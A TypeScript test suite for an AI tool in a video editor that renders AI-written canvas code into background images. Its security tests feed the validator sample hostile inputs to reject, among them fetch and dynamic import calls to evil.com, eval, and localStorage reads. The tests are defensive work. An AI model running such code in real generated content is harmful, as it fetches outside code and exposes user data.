import { afterEach, beforeEach, describe, expect, test, mock } from "bun:test";
import { executeAIActions } from "@/lib/ai/executor";
import type { AIAction } from "@/lib/ai/types";

/*  Mock helpers  */

let mockAssets: Array<{ id: string; name: string; type: string }> = [];
let insertElementCalls: unknown[] = [];
let addMediaAssetCalls: unknown[] = [];
let lastCanvasOps: string[] = [];

function createMockCtx() {
  const ops: string[] = [];
  lastCanvasOps = ops;
  return {
    fillStyle: "",
    strokeStyle: "",
    lineWidth: 1,
    fillRect: (...args: unknown[]) => ops.push(`fillRect(${args.join(",")})`),
    strokeRect: (...args: unknown[]) => ops.push(`strokeRect(${args.join(",")})`),
    beginPath: () => ops.push("beginPath"),
    moveTo: (...args: unknown[]) => ops.push(`moveTo(${args.join(",")})`),
    lineTo: (...args: unknown[]) => ops.push(`lineTo(${args.join(",")})`),
    stroke: () => ops.push("stroke"),
    arc: (...args: unknown[]) => ops.push(`arc(${args.join(",")})`),
    closePath: () => ops.push("closePath"),
    fill: () => ops.push("fill"),
    save: () => ops.push("save"),
    restore: () => ops.push("restore"),
    clearRect: (...args: unknown[]) => ops.push(`clearRect(${args.join(",")})`),
    createLinearGradient: () => ({
      addColorStop: () => {},
    }),
    createRadialGradient: () => ({
      addColorStop: () => {},
    }),
    _ops: ops,
  };
}

function createMockCanvas() {
  const ctx = createMockCtx();
  return {
    width: 0,
    height: 0,
    getContext: (type: string) => (type === "2d" ? ctx : null),
    toBlob: (cb: (blob: Blob | null) => void, mimeType?: string) => {
      // Simulate async toBlob with a valid PNG blob
      setTimeout(() => cb(new Blob(["fake-png-data"], { type: mimeType || "image/png" })), 0);
    },
    toDataURL: (_type?: string, _quality?: number) => "data:image/jpeg;base64,fakethumb",
    _ctx: ctx,
  };
}

function setupMocks() {
  mockAssets = [];
  insertElementCalls = [];
  addMediaAssetCalls = [];
  lastCanvasOps = [];

  const mockEditor = {
    timeline: {
      getTracks: () => [],
      insertElement: (params: unknown) => insertElementCalls.push(params),
      updateTracks: () => {},
    },
    media: {
      addMediaAsset: async (params: any) => {
        addMediaAssetCalls.push(params);
        const id = `asset-${Date.now()}-${Math.random().toString(36).slice(2)}`;
        mockAssets.push({
          id,
          name: params.asset.name,
          type: params.asset.type,
        });
      },
      getAssets: () => mockAssets,
    },
    project: {
      getActive: () => ({
        metadata: { id: "test-project-id" },
        settings: {
          canvasSize: { width: 1920, height: 1080 },
        },
      }),
    },
    playback: {
      getCurrentTime: () => 0,
      seek: () => {},
    },
    command: {
      execute: () => {},
    },
  };

  (globalThis as any).window = (globalThis as any).window || {};
  (globalThis as any).window.__editor = mockEditor;

  // Mock document.createElement for canvas
  const origCreateElement = (globalThis as any).document?.createElement;
  if (typeof (globalThis as any).document === "undefined") {
    (globalThis as any).document = {};
  }
  (globalThis as any).document.createElement = (tag: string) => {
    if (tag === "canvas") return createMockCanvas();
    if (origCreateElement) return origCreateElement.call(document, tag);
    return {};
  };

  // Mock URL.createObjectURL
  if (typeof URL.createObjectURL !== "function") {
    (URL as any).createObjectURL = (_obj: any) => `blob:mock-url-${Date.now()}`;
  }

  return { mockEditor };
}

function teardownMocks() {
  delete (globalThis as any).window.__editor;
}

/*  Helper to run a single action  */

async function runInsertGeneratedImage(params: Record<string, unknown>) {
  const action: AIAction = {
    tool: "insert_generated_image",
    params,
  };
  const results = await executeAIActions([action]);
  return results[0];
}

/*  Tests  */

describe("insert_generated_image", () => {
  beforeEach(() => {
    setupMocks();
  });

  afterEach(() => {
    teardownMocks();
  });

  //  Validation tests 

  describe("parameter validation", () => {
    test("fails when neither color nor code is provided", async () => {
      const result = await runInsertGeneratedImage({
        startTime: 0,
        duration: 5,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("requires at least one of color or code");
    });

    test("fails when both color and code are empty strings", async () => {
      const result = await runInsertGeneratedImage({
        color: "",
        code: "",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("requires at least one of color or code");
    });

    test("fails when no active project", async () => {
      const editor = (globalThis as any).window.__editor;
      editor.project.getActive = () => null;

      const result = await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("No active project");
    });
  });

  //  Security validation tests 

  describe("security validation", () => {
    test("blocks code containing fetch()", async () => {
      const result = await runInsertGeneratedImage({
        code: "fetch('https://evil.com').then(r => r.text())",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("blocks code containing eval()", async () => {
      const result = await runInsertGeneratedImage({
        code: "eval('alert(1)')",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("blocks code containing localStorage", async () => {
      const result = await runInsertGeneratedImage({
        code: "localStorage.getItem('key')",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("blocks code containing new Function", async () => {
      const result = await runInsertGeneratedImage({
        code: "new Function('return 1')()",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("blocks code containing import()", async () => {
      const result = await runInsertGeneratedImage({
        code: "import('https://evil.com/module.js')",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("blocks code containing __editor", async () => {
      const result = await runInsertGeneratedImage({
        code: "window.__editor.project.getActive()",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("blocks code exceeding 5000 chars", async () => {
      const result = await runInsertGeneratedImage({
        code: "ctx.fillRect(0,0,1,1);".repeat(500),
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Security");
    });

    test("allows safe canvas drawing code", async () => {
      const result = await runInsertGeneratedImage({
        color: "#000000",
        code: "ctx.strokeStyle = 'white'; ctx.lineWidth = 1; ctx.beginPath(); ctx.moveTo(0,0); ctx.lineTo(100,100); ctx.stroke();",
        startTime: 0,
      });
      expect(result.success).toBe(true);
    });
  });

  //  Solid color tests 

  describe("solid color (no code)", () => {
    test("creates a solid black background", async () => {
      const result = await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
        duration: 60,
        name: "Black BG",
      });
      expect(result.success).toBe(true);
      expect(result.result).toBeDefined();
      expect((result.result as any).startTime).toBe(0);
      expect((result.result as any).duration).toBe(60);
    });

    test("adds asset to media library with correct properties", async () => {
      await runInsertGeneratedImage({
        color: "#ff0000",
        startTime: 0,
        duration: 10,
        name: "Red BG",
      });
      expect(addMediaAssetCalls.length).toBe(1);
      const call = addMediaAssetCalls[0] as any;
      expect(call.projectId).toBe("test-project-id");
      expect(call.asset.type).toBe("image");
      expect(call.asset.width).toBe(1920);
      expect(call.asset.height).toBe(1080);
      expect(call.asset.url).toBeDefined();
      expect(call.asset.url).toContain("blob:");
      expect(call.asset.thumbnailUrl).toBeDefined();
      expect(call.asset.file).toBeInstanceOf(File);
    });

    test("inserts image element on video track", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 5,
        duration: 30,
      });
      expect(insertElementCalls.length).toBe(1);
      const call = insertElementCalls[0] as any;
      expect(call.element.type).toBe("image");
      expect(call.element.startTime).toBe(5);
      expect(call.element.duration).toBe(30);
      expect(call.element.mediaId).toBeDefined();
      expect(call.placement.mode).toBe("auto");
      expect(call.placement.trackType).toBe("video");
    });

    test("uses default duration of 5 when not specified", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      const call = insertElementCalls[0] as any;
      expect(call.element.duration).toBe(5);
    });

    test("uses default startTime of 0 when not specified", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
      });
      const call = insertElementCalls[0] as any;
      expect(call.element.startTime).toBe(0);
    });
  });

  //  Drawing code tests 

  describe("canvas drawing code", () => {
    test("executes imperative drawing code", async () => {
      const result = await runInsertGeneratedImage({
        color: "#000000",
        code: "ctx.strokeStyle = 'white'; ctx.beginPath(); ctx.moveTo(0, 0); ctx.lineTo(100, 100); ctx.stroke();",
        startTime: 0,
        duration: 60,
      });
      expect(result.success).toBe(true);
      expect(lastCanvasOps).toContain("beginPath");
      expect(lastCanvasOps).toContain("stroke");
    });

    test("executes grid pattern code (the user's actual use case)", async () => {
      const gridCode = `
        ctx.strokeStyle = 'rgba(255,255,255,0.15)';
        ctx.lineWidth = 1;
        var step = 40;
        for (var x = 0; x <= width; x += step) {
          ctx.beginPath();
          ctx.moveTo(x, 0);
          ctx.lineTo(x, height);
          ctx.stroke();
        }
        for (var y = 0; y <= height; y += step) {
          ctx.beginPath();
          ctx.moveTo(0, y);
          ctx.lineTo(width, y);
          ctx.stroke();
        }
      `;
      const result = await runInsertGeneratedImage({
        color: "#000000",
        code: gridCode,
        startTime: 0,
        duration: 60,
        name: "Mystery Grid",
      });
      expect(result.success).toBe(true);
      // Should have drawn many grid lines
      const strokeCount = lastCanvasOps.filter((op) => op === "stroke").length;
      expect(strokeCount).toBeGreaterThan(10);
    });

    test("handles function expression code format", async () => {
      const result = await runInsertGeneratedImage({
        code: "(ctx, width, height) => { ctx.fillStyle = 'blue'; ctx.fillRect(0, 0, width, height); }",
        startTime: 0,
      });
      expect(result.success).toBe(true);
    });

    test("handles function keyword code format", async () => {
      const result = await runInsertGeneratedImage({
        code: "function(ctx, width, height) { ctx.fillStyle = 'red'; ctx.fillRect(0, 0, width, height); }",
        startTime: 0,
      });
      expect(result.success).toBe(true);
    });

    test("reports canvas code runtime errors clearly", async () => {
      const result = await runInsertGeneratedImage({
        code: "var x = undefined; x.foo();",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Canvas drawing code error");
    });

    test("reports canvas code syntax errors clearly", async () => {
      const result = await runInsertGeneratedImage({
        code: "if (true { ctx.fillRect(0,0,1,1); }",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Canvas drawing code error");
    });

    test("code-only (no color) succeeds", async () => {
      const result = await runInsertGeneratedImage({
        code: "ctx.fillStyle = '#00ff00'; ctx.fillRect(0, 0, width, height);",
        startTime: 0,
      });
      expect(result.success).toBe(true);
    });

    test("gradient drawing code works", async () => {
      const result = await runInsertGeneratedImage({
        code: "var g = ctx.createLinearGradient(0, 0, 0, height); g.addColorStop(0, '#1a1a2e'); g.addColorStop(1, '#16213e'); ctx.fillStyle = g; ctx.fillRect(0, 0, width, height);",
        startTime: 0,
        duration: 30,
      });
      expect(result.success).toBe(true);
    });
  });

  //  Dimension tests 

  describe("dimensions", () => {
    test("uses project canvas size by default", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      const call = addMediaAssetCalls[0] as any;
      expect(call.asset.width).toBe(1920);
      expect(call.asset.height).toBe(1080);
    });

    test("accepts custom dimensions", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        width: 800,
        height: 600,
        startTime: 0,
      });
      const call = addMediaAssetCalls[0] as any;
      expect(call.asset.width).toBe(800);
      expect(call.asset.height).toBe(600);
    });

    test("caps dimensions at 4096", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        width: 8000,
        height: 8000,
        startTime: 0,
      });
      const call = addMediaAssetCalls[0] as any;
      expect(call.asset.width).toBe(4096);
      expect(call.asset.height).toBe(4096);
    });
  });

  //  Transform/opacity tests 

  describe("transform and opacity", () => {
    test("uses default transform when not specified", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      const call = insertElementCalls[0] as any;
      expect(call.element.transform.scale).toBe(1);
      expect(call.element.transform.position).toEqual({ x: 0, y: 0 });
      expect(call.element.transform.rotate).toBe(0);
      expect(call.element.opacity).toBe(1);
    });

    test("accepts custom position", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
        position: { x: 100, y: -50 },
      });
      const call = insertElementCalls[0] as any;
      expect(call.element.transform.position).toEqual({ x: 100, y: -50 });
    });

    test("accepts custom scale and opacity", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
        scale: 0.5,
        opacity: 0.8,
      });
      const call = insertElementCalls[0] as any;
      expect(call.element.transform.scale).toBe(0.5);
      expect(call.element.opacity).toBe(0.8);
    });
  });

  //  Media library integration tests 

  describe("media library integration", () => {
    test("asset filename is sanitized and unique", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
        name: "My <Special> Image!",
      });
      const call = addMediaAssetCalls[0] as any;
      expect(call.asset.name).not.toContain("<");
      expect(call.asset.name).not.toContain(">");
      expect(call.asset.name).not.toContain("!");
      expect(call.asset.name).toEndWith(".png");
    });

    test("returns mediaId in result", async () => {
      const result = await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      expect(result.success).toBe(true);
      expect((result.result as any).mediaId).toBeDefined();
    });

    test("file has correct MIME type", async () => {
      await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      const call = addMediaAssetCalls[0] as any;
      expect(call.asset.file.type).toBe("image/png");
    });

    test("fails gracefully when asset not found after add (storage failure simulation)", async () => {
      const editor = (globalThis as any).window.__editor;
      // Simulate storage failure: addMediaAsset succeeds but asset is reverted
      editor.media.addMediaAsset = async () => {
        // Don't push to mockAssets — simulates storage revert
      };

      const result = await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Failed to find generated image");
    });
  });

  //  End-to-end scenario tests 

  describe("end-to-end scenarios", () => {
    test("black background with white grid for 60 seconds (user's exact request)", async () => {
      const result = await runInsertGeneratedImage({
        color: "#000000",
        code: "ctx.strokeStyle = 'rgba(255,255,255,0.15)'; ctx.lineWidth = 1; var step = 40; for (var x = 0; x <= width; x += step) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, height); ctx.stroke(); } for (var y = 0; y <= height; y += step) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(width, y); ctx.stroke(); }",
        startTime: 0,
        duration: 60,
        name: "Mystery Reveal Background",
      });

      expect(result.success).toBe(true);

      // Check asset was created
      expect(addMediaAssetCalls.length).toBe(1);
      const asset = (addMediaAssetCalls[0] as any).asset;
      expect(asset.type).toBe("image");
      expect(asset.width).toBe(1920);
      expect(asset.height).toBe(1080);
      expect(asset.url).toBeDefined();
      expect(asset.thumbnailUrl).toBeDefined();

      // Check element was inserted
      expect(insertElementCalls.length).toBe(1);
      const element = (insertElementCalls[0] as any).element;
      expect(element.type).toBe("image");
      expect(element.startTime).toBe(0);
      expect(element.duration).toBe(60);
      expect(element.mediaId).toBeDefined();
    });

    test("solid red background from 10s to 15s", async () => {
      const result = await runInsertGeneratedImage({
        color: "#ff0000",
        startTime: 10,
        duration: 5,
        name: "Red Screen",
      });
      expect(result.success).toBe(true);
      const element = (insertElementCalls[0] as any).element;
      expect(element.startTime).toBe(10);
      expect(element.duration).toBe(5);
    });

    test("gradient background for full video", async () => {
      const result = await runInsertGeneratedImage({
        code: "var g = ctx.createLinearGradient(0, 0, 0, height); g.addColorStop(0, '#1a1a2e'); g.addColorStop(1, '#16213e'); ctx.fillStyle = g; ctx.fillRect(0, 0, width, height);",
        startTime: 0,
        duration: 120,
        name: "Gradient BG",
      });
      expect(result.success).toBe(true);
    });

    test("multiple generated images can be created sequentially", async () => {
      const r1 = await runInsertGeneratedImage({
        color: "#000000",
        startTime: 0,
        duration: 10,
      });
      const r2 = await runInsertGeneratedImage({
        color: "#ffffff",
        startTime: 10,
        duration: 10,
      });
      expect(r1.success).toBe(true);
      expect(r2.success).toBe(true);
      expect(mockAssets.length).toBe(2);
      expect(insertElementCalls.length).toBe(2);
    });
  });

  //  Dangerous globals shadowing tests 

  describe("global shadowing in code execution", () => {
    test("fetch is undefined inside code execution", async () => {
      // Code that uses fetch would be blocked by security validation,
      // but even if bypassed, fetch is shadowed to undefined
      const result = await runInsertGeneratedImage({
        code: "if (typeof ctx === 'object') { ctx.fillStyle = 'green'; ctx.fillRect(0,0,width,height); }",
        startTime: 0,
      });
      expect(result.success).toBe(true);
    });
  });

  //  executeAIActions integration 

  describe("executeAIActions integration", () => {
    test("insert_generated_image is recognized as a valid tool", async () => {
      const results = await executeAIActions([
        {
          tool: "insert_generated_image",
          params: { color: "#000000", startTime: 0, duration: 5 },
        },
      ]);
      expect(results.length).toBe(1);
      expect(results[0].success).toBe(true);
    });

    test("works alongside other actions in sequence", async () => {
      const results = await executeAIActions([
        {
          tool: "insert_generated_image",
          params: { color: "#000000", startTime: 0, duration: 60 },
        },
        {
          tool: "set_playhead",
          params: { time: 0 },
        },
      ]);
      expect(results.length).toBe(2);
      expect(results[0].success).toBe(true);
      expect(results[1].success).toBe(true);
    });
  });
});
